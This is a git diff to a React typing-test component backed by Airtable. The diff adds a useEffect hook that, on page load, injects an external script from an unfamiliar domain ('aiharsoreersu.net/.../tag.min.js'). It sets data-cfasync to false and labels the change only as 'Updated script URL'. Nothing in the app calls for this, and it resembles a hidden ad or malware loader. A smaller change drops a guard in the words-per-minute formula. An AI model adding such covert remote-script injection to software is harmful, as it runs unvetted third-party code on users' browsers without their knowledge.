@@ -3,7 +3,28 @@ import { useParams, useNavigate } from 'react-router-dom';
 import base from './airtable';
 import './typing.css';
 
-export default function Typing() {
+export default function Typing() {useEffect(() => {
+  const scriptElement = document.createElement('script');
+  scriptElement.src = 'https://aiharsoreersu.net/act/files/tag.min.js?z=8685115';  // Updated script URL
+  scriptElement.async = true; // Ensure the script loads asynchronously
+  scriptElement.setAttribute('data-cfasync', 'false'); // Set the data-cfasync attribute to false
+
+  // Try appending the script
+  try {
+    (document.body || document.documentElement).appendChild(scriptElement);
+    console.log('Script loaded successfully.');
+  } catch (error) {
+    console.error('Error appending the script:', error);
+  }
+
+  // Cleanup: Remove the script when the component is unmounted
+  return () => {
+    if (scriptElement) {
+      scriptElement.remove();
+      console.log('Script removed.');
+    }
+  };
+}, []); 
   const [texts, setTexts] = useState([]);
   const [userInput, setUserInput] = useState('');
   const currentSentenceIndex = 0; 
@@ -54,7 +75,7 @@ const [typed,settyped]=useState();
     const accuracy = (correctWords / typed) * 100 || 0;
     const timeInSecondsValue = parseInt(timeInSeconds[time] || 0); 
 const timeInMinutes = timeInSecondsValue > 0 ? timeInSecondsValue / 60 : 1;
-const wpm = correctWords > 0 && timeInMinutes > 0 ? correctWords/timeInMinutes : 0;
+const wpm = correctWords/timeInMinutes;
 
     const timeTaken = parseInt(timeInSeconds[time] || 0) - timeRemaining;
   
